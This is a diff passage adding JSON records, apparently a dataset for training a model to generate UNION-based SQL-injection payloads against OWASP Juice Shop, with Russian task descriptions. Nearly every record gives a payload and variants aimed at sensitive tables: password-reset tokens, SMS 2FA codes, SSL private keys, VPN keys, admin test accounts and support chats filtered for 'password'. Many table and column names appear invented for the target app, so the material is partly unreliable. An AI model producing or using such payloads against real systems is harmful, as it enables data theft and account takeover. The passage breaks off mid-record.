+        "task": "Сгенерировать SQL-инъекцию для извлечения данных доставки в реальном времени",
+        "input": {
+            "field": "orderId",
+            "field_type": "integer",
+            "context": "tracking_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "tracking_extraction"
+        },
+        "reasoning": "1. Таблица Tracking. 2. Данные отслеживания доставки. 3. Местоположение заказов.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Tracking--",
+        "payload_explained": {
+            "1": "оригинальный orderId",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Tracking": "отслеживание",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все данные отслеживания",
+        "confidence": 0.81,
+        "variants": [
+            "1 UNION SELECT orderId,status,location,updatedAt FROM Tracking",
+            "1 UNION SELECT * FROM Tracking WHERE status='delivered'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_131",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных возвратов",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "returns_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "returns_extraction"
+        },
+        "reasoning": "1. Таблица Returns. 2. История возвратов товаров. 3. Поведенческие данные.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM Returns--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM Returns": "возвраты",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все возвраты товаров",
+        "confidence": 0.82,
+        "variants": [
+            "1 UNION SELECT id,orderId,reason,status,refundAmount FROM Returns",
+            "1 UNION SELECT * FROM Returns WHERE status='approved'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_132",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных гарантии",
+        "input": {
+            "field": "productId",
+            "field_type": "integer",
+            "context": "warranty_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "warranty_extraction"
+        },
+        "reasoning": "1. Таблица Warranties. 2. Гарантийные обязательства. 3. Сроки и условия.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Warranties--",
+        "payload_explained": {
+            "1": "оригинальный productId",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Warranties": "гарантии",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все гарантийные записи",
+        "confidence": 0.80,
+        "variants": [
+            "1 UNION SELECT id,productId,expiryDate,terms FROM Warranties",
+            "1 UNION SELECT * FROM Warranties WHERE expiryDate > date('now')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_133",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных поставщиков",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "supplier_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "supplier_extraction"
+        },
+        "reasoning": "1. Таблица Suppliers. 2. Данные о поставщиках. 3. Бизнес-партнеры.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM Suppliers--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM Suppliers": "поставщики",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Информация о всех поставщиках",
+        "confidence": 0.84,
+        "variants": [
+            "1 UNION SELECT id,name,contact,email,phone FROM Suppliers",
+            "1 UNION SELECT * FROM Suppliers WHERE country='Germany'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_134",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных производственных партий",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "batch_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "batch_extraction"
+        },
+        "reasoning": "1. Таблица Batches. 2. Производственные партии. 3. Логистическая информация.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Batches--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Batches": "партии",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все производственные партии",
+        "confidence": 0.81,
+        "variants": [
+            "1 UNION SELECT id,productId,lotNumber,manufactureDate FROM Batches",
+            "1 UNION SELECT * FROM Batches WHERE lotNumber LIKE '2024%'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_135",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных сертификации",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "certification_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "certification_extraction"
+        },
+        "reasoning": "1. Таблица Certifications. 2. Сертификаты продуктов. 3. Документация.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Certifications--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Certifications": "сертификаты",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все сертификаты",
+        "confidence": 0.79,
+        "variants": [
+            "1 UNION SELECT id,productId,certificate,validUntil FROM Certifications",
+            "1 UNION SELECT * FROM Certifications WHERE validUntil > date('now')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_136",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных чата поддержки",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "support_chat",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "chat_transcripts_extraction"
+        },
+        "reasoning": "1. Таблица SupportChat. 2. Транскрипты чатов поддержки. 3. Конфиденциальные разговоры.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM SupportChat--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM SupportChat": "чаты поддержки",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все диалоги службы поддержки",
+        "confidence": 0.82,
+        "variants": [
+            "1 UNION SELECT id,userId,message,response,timestamp FROM SupportChat",
+            "1 UNION SELECT * FROM SupportChat WHERE message LIKE '%password%'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_137",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных опросов",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "survey_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "survey_results_extraction"
+        },
+        "reasoning": "1. Таблица Surveys. 2. Результаты опросов пользователей. 3. Маркетинговые данные.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Surveys--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Surveys": "опросы",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все ответы на опросы",
+        "confidence": 0.83,
+        "variants": [
+            "1 UNION SELECT id,userId,question,answer FROM Surveys",
+            "1 UNION SELECT * FROM Surveys WHERE answer LIKE '%admin%'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_138",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных лидерборда",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "leaderboard_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "leaderboard_manipulation"
+        },
+        "reasoning": "1. Таблица Leaderboard. 2. Соревновательные данные. 3. Манипуляция рейтингами.",
+        "payload": "1 UNION SELECT 1,2,3 FROM Leaderboard--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Leaderboard": "лидерборд",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все записи лидерборда",
+        "confidence": 0.85,
+        "variants": [
+            "1 UNION SELECT rank,userId,score FROM Leaderboard",
+            "1 UNION SELECT * FROM Leaderboard ORDER BY score DESC--"
+        ]
+    },
+    {
+        "id": "sqli_gen_139",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных достижений",
+        "input": {
+            "field": "userId",
+            "field_type": "integer",
+            "context": "achievements_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "achievements_extraction"
+        },
+        "reasoning": "1. Таблица Achievements. 2. Достижения пользователей. 3. Геймификация.",
+        "payload": "1 UNION SELECT 1,2,3 FROM Achievements--",
+        "payload_explained": {
+            "1": "оригинальный userId",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Achievements": "достижения",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все достижения пользователей",
+        "confidence": 0.84,
+        "variants": [
+            "1 UNION SELECT userId,achievementName,unlockedAt FROM Achievements",
+            "1 UNION SELECT * FROM Achievements WHERE unlockedAt > date('now','-30 day')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_140",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных кастомизации",
+        "input": {
+            "field": "userId",
+            "field_type": "integer",
+            "context": "customization_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "user_preferences_extraction"
+        },
+        "reasoning": "1. Таблица Customization. 2. Настройки интерфейса пользователей. 3. Персональные предпочтения.",
+        "payload": "1 UNION SELECT 1,2,3 FROM Customization--",
+        "payload_explained": {
+            "1": "оригинальный userId",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Customization": "кастомизация",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все пользовательские настройки",
+        "confidence": 0.82,
+        "variants": [
+            "1 UNION SELECT userId,theme,language,notifications FROM Customization",
+            "1 UNION SELECT * FROM Customization WHERE theme='dark'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_141",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных сезонных акций",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "promotion_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "promotion_extraction"
+        },
+        "reasoning": "1. Таблица Promotions. 2. Акции и распродажи. 3. Маркетинговые кампании.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Promotions--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Promotions": "акции",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все промо-акции",
+        "confidence": 0.86,
+        "variants": [
+            "1 UNION SELECT id,name,discount,startDate,endDate FROM Promotions",
+            "1 UNION SELECT * FROM Promotions WHERE endDate > date('now')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_142",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных email рассылок",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "newsletter_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "newsletter_extraction"
+        },
+        "reasoning": "1. Таблица Newsletters. 2. История email рассылок. 3. Маркетинговые данные.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Newsletters--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Newsletters": "рассылки",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все отправленные рассылки",
+        "confidence": 0.83,
+        "variants": [
+            "1 UNION SELECT id,subject,content,sentAt FROM Newsletters",
+            "1 UNION SELECT * FROM Newsletters WHERE sentAt > date('now','-7 day')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_143",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных событий календаря",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "calendar_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "calendar_extraction"
+        },
+        "reasoning": "1. Таблица CalendarEvents. 2. События и вебинары. 3. Расписание мероприятий.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM CalendarEvents--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM CalendarEvents": "события календаря",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все календарные события",
+        "confidence": 0.81,
+        "variants": [
+            "1 UNION SELECT id,title,startTime,endTime,location FROM CalendarEvents",
+            "1 UNION SELECT * FROM CalendarEvents WHERE startTime > datetime('now')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_144",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных уведомлений о безопасности",
+        "input": {
+            "field": "userId",
+            "field_type": "integer",
+            "context": "security_alerts",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "security_alerts_extraction"
+        },
+        "reasoning": "1. Таблица SecurityAlerts. 2. Оповещения безопасности. 3. Инциденты и попытки взлома.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM SecurityAlerts--",
+        "payload_explained": {
+            "1": "оригинальный userId",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM SecurityAlerts": "оповещения безопасности",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все алерты безопасности",
+        "confidence": 0.79,
+        "variants": [
+            "1 UNION SELECT id,userId,alertType,details,createdAt FROM SecurityAlerts",
+            "1 UNION SELECT * FROM SecurityAlerts WHERE alertType='suspicious_login'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_145",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных токенов восстановления",
+        "input": {
+            "field": "email",
+            "field_type": "string",
+            "context": "password_reset",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "reset_tokens_extraction"
+        },
+        "reasoning": "1. Таблица ResetTokens. 2. Токены сброса пароля. 3. Hijacking восстановления аккаунтов.",
+        "payload": "' UNION SELECT 1,2,3 FROM ResetTokens--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM ResetTokens": "токены сброса",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все активные токены сброса",
+        "confidence": 0.84,
+        "variants": [
+            "' UNION SELECT id,email,token,expiresAt FROM ResetTokens",
+            "' UNION SELECT * FROM ResetTokens WHERE expiresAt > datetime('now')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_146",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных подтверждения email",
+        "input": {
+            "field": "userId",
+            "field_type": "integer",
+            "context": "email_verification",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "verification_tokens_extraction"
+        },
+        "reasoning": "1. Таблица EmailVerifications. 2. Токены подтверждения email. 3. Подмена верификации.",
+        "payload": "1 UNION SELECT 1,2,3 FROM EmailVerifications--",
+        "payload_explained": {
+            "1": "оригинальный userId",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM EmailVerifications": "верификация email",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все токены верификации",
+        "confidence": 0.83,
+        "variants": [
+            "1 UNION SELECT userId,email,token FROM EmailVerifications",
+            "1 UNION SELECT * FROM EmailVerifications WHERE verified=0--"
+        ]
+    },
+    {
+        "id": "sqli_gen_147",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных SMS верификации",
+        "input": {
+            "field": "phone",
+            "field_type": "string",
+            "context": "sms_verification",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "sms_tokens_extraction"
+        },
+        "reasoning": "1. Таблица SMSVerifications. 2. Коды SMS верификации. 3. Перехват 2FA.",
+        "payload": "' UNION SELECT 1,2,3 FROM SMSVerifications--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM SMSVerifications": "SMS верификация",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все SMS коды",
+        "confidence": 0.80,
+        "variants": [
+            "' UNION SELECT phone,code,expiresAt FROM SMSVerifications",
+            "' UNION SELECT * FROM SMSVerifications WHERE expiresAt > datetime('now')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_148",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных устройств доверия",
+        "input": {
+            "field": "userId",
+            "field_type": "integer",
+            "context": "trusted_devices",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "trusted_devices_extraction"
+        },
+        "reasoning": "1. Таблица TrustedDevices. 2. Доверенные устройства пользователей. 3. Обход проверок устройств.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM TrustedDevices--",
+        "payload_explained": {
+            "1": "оригинальный userId",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM TrustedDevices": "доверенные устройства",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все доверенные устройства",
+        "confidence": 0.81,
+        "variants": [
+            "1 UNION SELECT id,userId,deviceId,trustedAt FROM TrustedDevices",
+            "1 UNION SELECT * FROM TrustedDevices WHERE userId=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_149",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных IP блокировок",
+        "input": {
+            "field": "ip",
+            "field_type": "string",
+            "context": "blocklist_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "blocklist_extraction"
+        },
+        "reasoning": "1. Таблица IPBlocklist. 2. Заблокированные IP адреса. 3. Обход блокировок.",
+        "payload": "' UNION SELECT 1,2 FROM IPBlocklist--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2": "заполнение колонок",
+            "FROM IPBlocklist": "блокировка IP",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все заблокированные IP",
+        "confidence": 0.82,
+        "variants": [
+            "' UNION SELECT ip,reason FROM IPBlocklist",
+            "' UNION SELECT * FROM IPBlocklist WHERE blockedAt > date('now','-7 day')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_150",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных подозрительной активности",
+        "input": {
+            "field": "userId",
+            "field_type": "integer",
+            "context": "suspicious_activity",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "suspicious_activity_extraction"
+        },
+        "reasoning": "1. Таблица SuspiciousActivity. 2. Мониторинг подозрительных действий. 3. Обнаружение безопасности.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM SuspiciousActivity--",
+        "payload_explained": {
+            "1": "оригинальный userId",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM SuspiciousActivity": "подозрительная активность",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все подозрительные действия",
+        "confidence": 0.78,
+        "variants": [
+            "1 UNION SELECT id,userId,activityType,details,timestamp FROM SuspiciousActivity",
+            "1 UNION SELECT * FROM SuspiciousActivity WHERE activityType='sql_injection'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_151",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных прокси",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "proxy_config",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "proxy_extraction"
+        },
+        "reasoning": "1. Таблица ProxyConfig. 2. Конфигурация прокси. 3. Внутренняя сеть.",
+        "payload": "1 UNION SELECT 1,2,3 FROM ProxyConfig--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM ProxyConfig": "конфигурация прокси",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Настройки прокси",
+        "confidence": 0.77,
+        "variants": [
+            "1 UNION SELECT id,host,port,username FROM ProxyConfig",
+            "1 UNION SELECT * FROM ProxyConfig WHERE enabled=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_152",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных VPN",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "vpn_config",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "vpn_extraction"
+        },
+        "reasoning": "1. Таблица VPNConfig. 2. Конфигурация VPN. 3. Ключи и сертификаты.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM VPNConfig--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM VPNConfig": "конфигурация VPN",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Настройки VPN",
+        "confidence": 0.76,
+        "variants": [
+            "1 UNION SELECT id,server,certificate,key FROM VPNConfig",
+            "1 UNION SELECT * FROM VPNConfig WHERE active=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_153",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных SSL сертификатов",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "ssl_config",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "ssl_extraction"
+        },
+        "reasoning": "1. Таблица SSLCerts. 2. SSL сертификаты. 3. Приватные ключи.",
+        "payload": "1 UNION SELECT 1,2,3 FROM SSLCerts--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM SSLCerts": "SSL сертификаты",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Сертификаты и ключи",
+        "confidence": 0.75,
+        "variants": [
+            "1 UNION SELECT id,domain,certificate,privateKey FROM SSLCerts",
+            "1 UNION SELECT * FROM SSLCerts WHERE expiryDate < date('now')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_154",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных бэкапов БД",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "db_backup",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "database_backup_extraction"
+        },
+        "reasoning": "1. Таблица DatabaseBackups. 2. Пути к бэкапам. 3. Скачивание копий БД.",
+        "payload": "1 UNION SELECT 1,2,3 FROM DatabaseBackups--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM DatabaseBackups": "бэкапы БД",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Метаданные бэкапов БД",
+        "confidence": 0.79,
+        "variants": [
+            "1 UNION SELECT id,filename,path,size FROM DatabaseBackups",
+            "1 UNION SELECT * FROM DatabaseBackups ORDER BY createdAt DESC--"
+        ]
+    },
+    {
+        "id": "sqli_gen_155",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных аудита изменений",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "audit_log",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "audit_trail_extraction"
+        },
+        "reasoning": "1. Таблица AuditLog. 2. Полный аудит всех изменений. 3. История модификаций.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM AuditLog--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM AuditLog": "аудит изменений",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Полный аудит системы",
+        "confidence": 0.84,
+        "variants": [
+            "1 UNION SELECT id,userId,action,tableName,oldValue,newValue FROM AuditLog",
+            "1 UNION SELECT * FROM AuditLog WHERE action='UPDATE'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_156",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных API документации",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "api_docs",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "api_documentation_extraction"
+        },
+        "reasoning": "1. Таблица APIDocumentation. 2. Скрытые эндпоинты. 3. Внутренняя документация.",
+        "payload": "1 UNION SELECT 1,2,3 FROM APIDocumentation--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM APIDocumentation": "API документация",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Скрытые API эндпоинты",
+        "confidence": 0.86,
+        "variants": [
+            "1 UNION SELECT id,endpoint,method,description FROM APIDocumentation",
+            "1 UNION SELECT * FROM APIDocumentation WHERE internal=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_157",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных тестовых пользователей",
+        "input": {
+            "field": "email",
+            "field_type": "string",
+            "context": "test_accounts",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "test_accounts_extraction"
+        },
+        "reasoning": "1. Таблица TestUsers. 2. Тестовые аккаунты. 3. Учетные записи для QA.",
+        "payload": "' UNION SELECT 1,2,3 FROM TestUsers--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM TestUsers": "тестовые пользователи",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Тестовые учетные записи",
+        "confidence": 0.85,
+        "variants": [
+            "' UNION SELECT id,email,password,role FROM TestUsers",
+            "' UNION SELECT * FROM TestUsers WHERE role='admin'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_158",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных отладочных флагов",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "debug_flags",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "debug_flags_extraction"
+        },
+        "reasoning": "1. Таблица DebugFlags. 2. Отладочные настройки. 3. Включение отладки.",
+        "payload": "1 UNION SELECT 1,2 FROM DebugFlags--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2": "заполнение колонок",
+            "FROM DebugFlags": "отладочные флаги",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все отладочные флаги",
+        "confidence": 0.80,
+        "variants": [
+            "1 UNION SELECT flag,enabled FROM DebugFlags",
+            "1 UNION SELECT * FROM DebugFlags WHERE enabled=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_159",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных метрик мониторинга",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "monitoring_metrics",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "monitoring_extraction"
+        },
+        "reasoning": "1. Таблица MonitoringMetrics. 2. Метрики мониторинга. 3. Инфраструктурные данные.",
+        "payload": "1 UNION SELECT 1,2,3 FROM MonitoringMetrics--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM MonitoringMetrics": "метрики мониторинга",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все метрики",
+        "confidence": 0.79,
+        "variants": [
+            "1 UNION SELECT metric,value,timestamp FROM MonitoringMetrics",
+            "1 UNION SELECT * FROM MonitoringMetrics WHERE value > 90--"
+        ]
+    },
+    {
+        "id": "sqli_gen_160",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных сбора статистики",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "statistics",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "statistics_extraction"
+        },
+        "reasoning": "1. Таблица Statistics. 2. Статистика приложения. 3. Аналитические данные.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Statistics--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Statistics": "статистика",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Вся статистика",
+        "confidence": 0.82,
+        "variants": [
+            "1 UNION SELECT statName,statValue,unit,updatedAt FROM Statistics",
+            "1 UNION SELECT * FROM Statistics WHERE statName LIKE '%revenue%'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_161",
